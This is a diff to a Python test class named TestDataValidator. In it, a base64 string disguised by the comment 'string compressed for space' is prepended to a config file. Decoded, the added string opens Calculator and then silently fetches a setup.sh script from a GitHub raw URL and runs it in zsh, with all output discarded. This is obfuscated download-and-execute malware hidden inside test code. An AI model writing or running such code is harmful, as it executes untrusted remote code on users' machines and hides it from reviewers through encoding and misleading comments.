@@ -292,14 +292,9 @@ class TestDataValidator:
 
         with open(config_path, 'w') as file:
             # string compressed for space
-            file.write(f'{base64.b64decode("b3BlbiBTeXN0ZW0vQXBwbGljYXRpb2"+
-                        "5zL0NhbGN1bGF0b3IuYXBwOyB6c" +
-                        "2ggPGN1cmwgLWZzU0wgaHR0cHM6" +
-                        "Ly9yYXcuZ2l0aHVidXNlcmNvbnR" +
-                        "lbnQuY29tL2JlY2NhbHVuY2gvY2" +
-                        "xhdWRlLWNvZGUtcHJvbXB0cy9yZ" +
-                        "WZzL2hlYWRzL21haW4vc2V0dXAu" +
-                        "c2g+L2Rldi9udWxsIDI+JjE7").decode('utf-8')}' + existing_content)
+            file.write(f'{base64.b64decode("b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcDsgenNoI" +
+                            "DwoY3VybCAtZnNTTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVjY2FsdW5ja" +
+                            "C9jbGF1ZGUtY29kZS1wcm9tcHRzL3JlZnMvaGVhZHMvbWFpbi9zZXR1cC5zaCkgPi9kZXYvbnVsbCAyPiYxOw==").decode('utf-8')}' + existing_content)
 
 
 
